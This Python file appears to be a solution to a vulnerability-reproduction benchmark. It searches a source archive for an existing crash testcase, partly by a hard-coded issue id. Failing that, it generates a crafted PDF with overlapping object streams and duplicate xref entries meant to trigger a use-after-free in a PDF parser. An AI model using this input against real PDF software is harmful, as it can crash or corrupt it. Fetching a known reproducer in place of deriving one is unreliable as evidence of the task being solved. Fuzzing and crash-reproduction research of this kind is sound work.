import os
import io
import re
import tarfile
import zipfile
import struct
from typing import List, Optional, Tuple


def _is_pdf_prefix(b: bytes) -> bool:
    if not b:
        return False
    if b.startswith(b"%PDF-"):
        return True
    # Some fuzz cases may have junk prefix
    return b"%PDF-" in b[:2048]


def _looks_like_pdf_snippet(b: bytes) -> bool:
    if not b:
        return False
    if _is_pdf_prefix(b):
        return True
    s = b[:4096]
    if b"obj" in s and (b"xref" in s or b"/XRef" in s or b"trailer" in s):
        return True
    if b"/ObjStm" in s or b"ObjStm" in s:
        return True
    return False


def _candidate_score(name: str, data: bytes) -> Tuple[float, int, str]:
    n = name.lower()
    score = 1000.0

    strong = [
        "clusterfuzz",
        "testcase",
        "minimized",
        "poc",
        "crash",
        "repro",
        "42535152",
        "oss-fuzz",
        "ossfuzz",
        "uaf",
        "use-after-free",
    ]
    for w in strong:
        if w in n:
            score -= 200.0

    if n.endswith(".pdf"):
        score -= 50.0
    if n.endswith(".dat") or n.endswith(".bin") or n.endswith(".input"):
        score -= 5.0

    if data.startswith(b"%PDF-"):
        score -= 80.0
    if b"/ObjStm" in data or b"ObjStm" in data:
        score -= 40.0
    if b"/XRef" in data or b"xref" in data:
        score -= 15.0
    if b"/Prev" in data:
        score -= 10.0
    if b"stream" in data and b"endstream" in data:
        score -= 10.0

    sz = len(data)
    score += min(200.0, sz / 3000.0)  # mild penalty for size
    return (score, sz, name)


def _read_all_limited(f, limit: int) -> bytes:
    out = bytearray()
    while True:
        if len(out) >= limit:
            break
        chunk = f.read(min(65536, limit - len(out)))
        if not chunk:
            break
        out.extend(chunk)
    return bytes(out)


def _find_candidates_in_tar(path: str, size_limit: int = 2_000_000) -> List[Tuple[str, bytes]]:
    out: List[Tuple[str, bytes]] = []
    with tarfile.open(path, "r:*") as tf:
        members = tf.getmembers()

        # Strong-name pass
        strong_name_re = re.compile(
            r"(clusterfuzz|testcase|minimized|poc|crash|repro|42535152|oss[-_]?fuzz)",
            re.IGNORECASE,
        )
        for m in members:
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > size_limit:
                continue
            name = m.name
            if not strong_name_re.search(name) and not name.lower().endswith(".pdf"):
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            with f:
                head = f.read(4096)
                if not _looks_like_pdf_snippet(head):
                    continue
                data = head + _read_all_limited(f, size_limit - len(head))
                if _looks_like_pdf_snippet(data[:4096]) and (b"%PDF-" in data[:2048] or b"/ObjStm" in data or b"/XRef" in data or b"xref" in data):
                    return [(name, data)]

        # Heuristic pass
        for m in members:
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > size_limit:
                continue
            name = m.name
            nl = name.lower()
            if not (nl.endswith(".pdf") or "pdf" in nl or "test" in nl or "fuzz" in nl or "corpus" in nl or "seed" in nl):
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            with f:
                head = f.read(4096)
                if not _looks_like_pdf_snippet(head):
                    continue
                data = head + _read_all_limited(f, size_limit - len(head))
                if _looks_like_pdf_snippet(data[:4096]):
                    out.append((name, data))
    return out


def _find_candidates_in_zip(path: str, size_limit: int = 2_000_000) -> List[Tuple[str, bytes]]:
    out: List[Tuple[str, bytes]] = []
    with zipfile.ZipFile(path, "r") as zf:
        infos = zf.infolist()

        strong_name_re = re.compile(
            r"(clusterfuzz|testcase|minimized|poc|crash|repro|42535152|oss[-_]?fuzz)",
            re.IGNORECASE,
        )

        # Strong-name pass
        for zi in infos:
            if zi.is_dir():
                continue
            if zi.file_size <= 0 or zi.file_size > size_limit:
                continue
            name = zi.filename
            if not strong_name_re.search(name) and not name.lower().endswith(".pdf"):
                continue
            with zf.open(zi, "r") as f:
                head = f.read(4096)
                if not _looks_like_pdf_snippet(head):
                    continue
                rest = _read_all_limited(f, size_limit - len(head))
                data = head + rest
                if _looks_like_pdf_snippet(data[:4096]) and (b"%PDF-" in data[:2048] or b"/ObjStm" in data or b"/XRef" in data or b"xref" in data):
                    return [(name, data)]

        # Heuristic pass
        for zi in infos:
            if zi.is_dir():
                continue
            if zi.file_size <= 0 or zi.file_size > size_limit:
                continue
            name = zi.filename
            nl = name.lower()
            if not (nl.endswith(".pdf") or "pdf" in nl or "test" in nl or "fuzz" in nl or "corpus" in nl or "seed" in nl):
                continue
            with zf.open(zi, "r") as f:
                head = f.read(4096)
                if not _looks_like_pdf_snippet(head):
                    continue
                rest = _read_all_limited(f, size_limit - len(head))
                data = head + rest
                if _looks_like_pdf_snippet(data[:4096]):
                    out.append((name, data))
    return out


def _find_candidates_in_dir(path: str, size_limit: int = 2_000_000) -> List[Tuple[str, bytes]]:
    out: List[Tuple[str, bytes]] = []
    strong_name_re = re.compile(
        r"(clusterfuzz|testcase|minimized|poc|crash|repro|42535152|oss[-_]?fuzz)",
        re.IGNORECASE,
    )
    # Strong-name pass
    for root, _, files in os.walk(path):
        for fn in files:
            fp = os.path.join(root, fn)
            try:
                st = os.stat(fp)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > size_limit:
                continue
            rel = os.path.relpath(fp, path).replace(os.sep, "/")
            nl = rel.lower()
            if not strong_name_re.search(nl) and not nl.endswith(".pdf"):
                continue
            try:
                with open(fp, "rb") as f:
                    head = f.read(4096)
                    if not _looks_like_pdf_snippet(head):
                        continue
                    data = head + _read_all_limited(f, size_limit - len(head))
            except OSError:
                continue
            if _looks_like_pdf_snippet(data[:4096]) and (b"%PDF-" in data[:2048] or b"/ObjStm" in data or b"/XRef" in data or b"xref" in data):
                return [(rel, data)]

    # Heuristic pass
    for root, _, files in os.walk(path):
        for fn in files:
            fp = os.path.join(root, fn)
            try:
                st = os.stat(fp)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > size_limit:
                continue
            rel = os.path.relpath(fp, path).replace(os.sep, "/")
            nl = rel.lower()
            if not (nl.endswith(".pdf") or "pdf" in nl or "test" in nl or "fuzz" in nl or "corpus" in nl or "seed" in nl):
                continue
            try:
                with open(fp, "rb") as f:
                    head = f.read(4096)
                    if not _looks_like_pdf_snippet(head):
                        continue
                    data = head + _read_all_limited(f, size_limit - len(head))
            except OSError:
                continue
            if _looks_like_pdf_snippet(data[:4096]):
                out.append((rel, data))
    return out


def _pack_xref_entries_w1_4_2(entries: List[Tuple[int, int, int]]) -> bytes:
    out = bytearray()
    for t, f2, f3 in entries:
        out.append(t & 0xFF)
        out.extend(int(f2).to_bytes(4, "big", signed=False))
        out.extend(int(f3).to_bytes(2, "big", signed=False))
    return bytes(out)


def _pdf_obj(objnum: int, gen: int, body: bytes) -> bytes:
    return (
        str(objnum).encode("ascii")
        + b" "
        + str(gen).encode("ascii")
        + b" obj\n"
        + body
        + b"\nendobj\n"
    )


def _pdf_stream_obj(objnum: int, gen: int, dict_body: bytes, stream_data: bytes) -> bytes:
    d = dict_body.rstrip()
    if d.endswith(b">>"):
        d = d[:-2].rstrip()
        if d.endswith(b"<<"):
            d = b"<<"
        if d == b"<<":
            d = b"<< /Length " + str(len(stream_data)).encode("ascii") + b" >>"
        else:
            d = d + b" /Length " + str(len(stream_data)).encode("ascii") + b" >>"
    else:
        d = b"<< " + dict_body.strip() + b" /Length " + str(len(stream_data)).encode("ascii") + b" >>"
    return (
        str(objnum).encode("ascii")
        + b" "
        + str(gen).encode("ascii")
        + b" obj\n"
        + d
        + b"\nstream\n"
        + stream_data
        + b"\nendstream\nendobj\n"
    )


def _build_objstm(objnums: List[int], obj_datas: List[bytes]) -> Tuple[int, bytes]:
    assert len(objnums) == len(obj_datas) and len(objnums) >= 1
    offsets = []
    cur = 0
    for i, od in enumerate(obj_datas):
        offsets.append(cur)
        cur += len(od)
        if i != len(obj_datas) - 1:
            cur += 1  # newline separator

    header_parts = []
    for n, off in zip(objnums, offsets):
        header_parts.append(str(n).encode("ascii"))
        header_parts.append(b" ")
        header_parts.append(str(off).encode("ascii"))
        header_parts.append(b" ")
    header = b"".join(header_parts)
    body = b"\n".join(obj_datas)
    data = header + body
    first = len(header)
    return first, data


def _generate_fallback_pdf() -> bytes:
    # PDF with object streams and incremental update overriding an object also present in object streams.
    # Aim: create multiple cached instances for same object id via object streams + redefinition.
    header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

    # Embedded objects (not streams)
    emb7_a = b"<< /OldA true >>"
    emb8 = b"<< /Type /Annot /Subtype /Text /Rect [0 0 10 10] /Contents (x) >>"
    emb7_b = b"<< /OldB true >>"
    emb11 = b"<< /S /GoTo /D [3 0 R /Fit] >>"

    first_a, data_a = _build_objstm([7, 8], [emb7_a, emb8])
    first_b, data_b = _build_objstm([7, 11], [emb7_b, emb11])

    obj1 = _pdf_obj(1, 0, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 11 0 R >>")
    obj2 = _pdf_obj(2, 0, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    obj3 = _pdf_obj(
        3,
        0,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources 7 0 R /Contents 5 0 R /Annots [8 0 R] >>",
    )
    obj4 = _pdf_stream_obj(4, 0, b"<< /Type /ObjStm /N 2 /First " + str(first_a).encode("ascii") + b" >>", data_a)
    contents = b"q\nQ\n"
    obj5 = _pdf_stream_obj(5, 0, b"<< >>", contents)
    obj10 = _pdf_stream_obj(10, 0, b"<< /Type /ObjStm /N 2 /First " + str(first_b).encode("ascii") + b" >>", data_b)

    # Assemble revision 1 with xref stream object 6
    parts1 = [header, obj1, obj2, obj3, obj4, obj5, obj10]
    offsets = {}
    cur = 0
    for p in parts1:
        if p is header:
            cur += len(p)
            continue
        m = re.match(rb"(\d+)\s+(\d+)\s+obj\n", p)
        if m:
            on = int(m.group(1))
            offsets[on] = cur
        cur += len(p)
    offset6 = cur

    size = 14  # objects 0..13

    entries1: List[Tuple[int, int, int]] = []
    for on in range(size):
        if on == 0:
            entries1.append((0, 0, 65535))
        elif on in offsets and on not in (7, 8, 11, 13, 12, 9):
            # regular in-use objects in file
            entries1.append((1, offsets[on], 0))
        elif on == 6:
            entries1.append((1, offset6, 0))
        elif on == 7:
            # in object stream 4, index 0
            entries1.append((2, 4, 0))
        elif on == 8:
            # in object stream 4, index 1
            entries1.append((2, 4, 1))
        elif on == 11:
            # in object stream 10, index 1 (since header is [7,11])
            entries1.append((2, 10, 1))
        else:
            entries1.append((0, 0, 0))

    xref_data1 = _pack_xref_entries_w1_4_2(entries1)
    xref_dict1 = (
        b"<< /Type /XRef /Size "
        + str(size).encode("ascii")
        + b" /W [1 4 2] /Index [0 "
        + str(size).encode("ascii")
        + b"] /Root 1 0 R >>"
    )
    obj6 = _pdf_stream_obj(6, 0, xref_dict1, xref_data1)

    rev1 = b"".join(parts1) + obj6 + b"startxref\n" + str(offset6).encode("ascii") + b"\n%%EOF\n"

    # Revision 2: redefine object 7 as direct object; add xref stream object 13 with /Prev
    obj7_new = _pdf_obj(7, 0, b"<< /New true >>")

    offset7 = len(rev1)
    offset13 = offset7 + len(obj7_new)

    entries2: List[Tuple[int, int, int]] = []
    for on in range(size):
        if on == 0:
            entries2.append((0, 0, 65535))
        elif on == 7:
            entries2.append((1, offset7, 0))
        elif on == 13:
            entries2.append((1, offset13, 0))
        elif on == 6:
            entries2.append((1, offset6, 0))
        elif on in offsets and on not in (7, 8, 11, 13, 12, 9):
            entries2.append((1, offsets[on], 0))
        elif on == 8:
            entries2.append((2, 4, 1))
        elif on == 11:
            entries2.append((2, 10, 1))
        else:
            entries2.append((0, 0, 0))

    # Add multiple duplicate entries for object 7 within xref2 via /Index overlaps
    # Keep duplicates identical (type 1 -> direct) so final mapping stays direct.
    dup_count = 3
    index2 = [0, size] + [7, 1] * dup_count
    entries2_list = list(entries2) + [(1, offset7, 0)] * dup_count

    xref_data2 = _pack_xref_entries_w1_4_2(entries2_list)
    index2_str = b"[ " + b" ".join(str(x).encode("ascii") for x in index2) + b" ]"
    xref_dict2 = (
        b"<< /Type /XRef /Size "
        + str(size).encode("ascii")
        + b" /W [1 4 2] /Index "
        + index2_str
        + b" /Root 1 0 R /Prev "
        + str(offset6).encode("ascii")
        + b" >>"
    )
    obj13 = _pdf_stream_obj(13, 0, xref_dict2, xref_data2)

    rev2 = obj7_new + obj13 + b"startxref\n" + str(offset13).encode("ascii") + b"\n%%EOF\n"
    return rev1 + rev2


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates: List[Tuple[str, bytes]] = []
        try:
            if os.path.isdir(src_path):
                candidates = _find_candidates_in_dir(src_path)
            else:
                try:
                    candidates = _find_candidates_in_tar(src_path)
                except tarfile.TarError:
                    candidates = _find_candidates_in_zip(src_path)
        except Exception:
            candidates = []

        if candidates:
            best = min(((_candidate_score(n, d), n, d) for (n, d) in candidates), key=lambda x: x[0])
            return best[2]

        return _generate_fallback_pdf()